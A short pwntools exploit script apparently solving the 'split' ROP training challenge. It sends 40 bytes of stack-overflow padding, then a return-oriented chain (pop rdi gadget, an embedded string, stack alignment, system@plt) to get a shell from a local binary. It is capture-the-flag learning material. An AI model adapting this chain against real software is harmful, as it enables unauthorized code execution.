from pwn import *

context.binary = "./split"
context.terminal = ["tmux", "splitw", "-h"]
elf = ELF("./split")

useful_fn_addr = elf.symbols["usefulFunction"]
useful_str_addr = elf.symbols["usefulString"]
system_plt = elf.plt["system"]

pop_rdi_ret = 0x4007C3
ret_gadget = 0x40053E

p = process("./split")

payload = b"A" * 40  # 32 byte buffer, 8 bytes for RBP

payload += p64(pop_rdi_ret)  # ret will pop this and execute this gadget
payload += p64(useful_str_addr)  # pop rdi from last gadget loads str addr into rdi

payload += p64(ret_gadget)  # align stack before system call
payload += p64(system_plt)  # ret from pop_rdi_ret will move us into here

p.sendline(payload)

p.interactive()
